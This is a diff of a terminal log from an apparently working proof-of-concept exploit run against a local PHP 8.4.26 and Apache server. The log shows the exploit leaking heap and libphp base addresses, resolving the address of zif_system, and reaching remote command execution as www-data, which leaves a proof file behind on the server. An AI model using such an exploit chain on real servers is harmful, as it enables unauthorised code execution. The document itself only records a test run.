@@ -1,19 +1,20 @@
-> python3 -u poc.py --url http://127.0.0.1:18086/ --skip-warmup
-
-[*] fingerprint status=302 php=PHP/8.4.26 server=Apache/2.4.69 (Debian)
+[?2004h[38;2;90;86;224m> [0m[Kclear
+[?2004l[H[2J[3J[?2004h[38;2;90;86;224m> [0mpython3 -u poc.py --url http://127.0.0.1:18086/ --skip-warmup
+[?2004l[*] fingerprint status=302 php=PHP/8.4.26 server=Apache/2.4.69 (Debian)
 [*] profile calibration -> official-php-8.4.26-apache-trixie-stock-preapp
 [*] profile=official-php-8.4.26-apache-trixie-stock-preapp build=official-php-8.4.26-apache-trixie-amd64 layout=trixie-reproducer-v1
 [*] offsets source=registry build=official-php-8.4.26-apache-trixie-amd64 zif=0x465370 dtor=0x65eb60 hash=0x690d8
-[*] remote proof path: /p31e384ec
+proof_command=id
+[*] remote proof path: /pfa15afa2
 [*] remote proof preflight status=404
 [*] pre-app heap attempt 1/24
-[+] heap chunk base: 0x7f513dc00000
+[+] heap chunk base: 0x7f5d6de00000
 [*] pre-app libphp attempt 1/24
-[+] libphp base: 0x7f513f857000
-[*] execution addresses: table=0x7f513dc690d8 zif_system=0x7f513fcbc370
+[+] libphp base: 0x7f5d6fa5c000
+[*] execution addresses: table=0x7f5d6de690d8 zif_system=0x7f5d6fec1370
 [*] pre-app execution attempt 1/24
 [!] execution attempt ended: RemoteDisconnected: Remote end closed connection without response
 [*] pre-app execution attempt 2/24
 [!] execution attempt ended: RemoteDisconnected: Remote end closed connection without response
 PROOF: uid=33(www-data) gid=33(www-data) groups=33(www-data)
-REMOTE_PROOF_REMAINS: /p31e384ec
+REMOTE_PROOF_REMAINS: /pfa15afa2
